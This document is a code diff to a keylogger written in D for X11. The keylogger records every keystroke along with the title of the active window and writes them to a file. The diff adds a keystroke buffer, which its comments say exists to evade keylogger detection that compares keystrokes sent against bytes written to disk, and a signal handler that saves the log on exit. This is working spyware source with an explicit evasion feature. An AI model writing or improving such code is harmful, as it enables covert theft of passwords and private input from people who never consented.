@@ -6,6 +6,8 @@ import x11.Xutil;
 import std.conv;
 import std.file;
 import std.array;
+import core.sys.posix.signal;
+
 
 // The file our keylog will be written to
 enum saveFile = "test.txt";
@@ -23,7 +25,21 @@ string currentWindowName;
 // The name of the last window the user typed in
 string lastWindowName;
 
+// If this is true then we have been sent sigint and should die
+bool doQuit;
+
+// Our keybuffer. We store our pressed keys in this buffer before writing them
+// to disk in order to avoid detection. (It's possible to check for keyloggers
+// by sending a process X bytes of key strokes and then checking if that program
+// writes X bytes to disk)
+string[] keyBuffer;
+
+// The max size of the key buffer before being written to disk
+int maxKeyBufferLength = 100;
+
 void main() {
+	// Our signal handler
+	signal(SIGINT, &handler);
 	// Set the error handler to our custom handler
 	XSetErrorHandler(&errorHandler);
 	Display* d = XOpenDisplay(null);
@@ -38,6 +54,14 @@ void main() {
     XSelectInput(d, curFocus, KeyPressMask|KeyReleaseMask|FocusChangeMask);
 	currentWindowName = getFocusedWindowName(d, curFocus);
 	while (true) {
+		// Check if we should write our log to disk
+		if (keyBuffer.length > maxKeyBufferLength || doQuit) {
+			writeLog();
+		}
+		// Check is we should exit
+		if (doQuit) {
+			break;
+		}
         XEvent ev;
         XNextEvent(d, &ev);
         switch (ev.type) {
@@ -89,12 +113,19 @@ void logKey(string key) {
 	// update the log
 	if (lastWindowName != currentWindowName) {
 		lastWindowName = currentWindowName;
-		std.file.append(saveFile, cast(void[])("\n" ~ currentWindowName ~ "\n"));
+		keyBuffer ~= "\n" ~ currentWindowName ~ "\n";
 	}
 	// Add a space to each key so we can tell if a user
 	// pressed a key or typed 
 	// (Tell if they pressed Tab (Will show up as "[tab]") or typed Tab (will show up as "[ T a b ] "))
-	std.file.append(saveFile, cast(void[])(key ~ " "));
+	keyBuffer ~= key ~ " ";
+	writefln("keyBuffer size: %d", keyBuffer.length);
+}
+
+// This function writes our keylog to disk
+void writeLog() {
+	std.file.append(saveFile, cast(void[])(join(keyBuffer)));
+	keyBuffer = null;
 }
 
 // Mapping some special keys to common names
@@ -173,4 +204,11 @@ string getFocusedWindowName(_XDisplay* d, ulong focus) {
 		}
 	}
 	return "[" ~ to!string(winName) ~ "]";
+}
+
+// Catch SIGINT and write our keylogs to disk before exiting
+extern(C) void handler(int num) nothrow @nogc @system
+{
+    printf("Caught signal %d\n",num);
+    doQuit = true;
 }
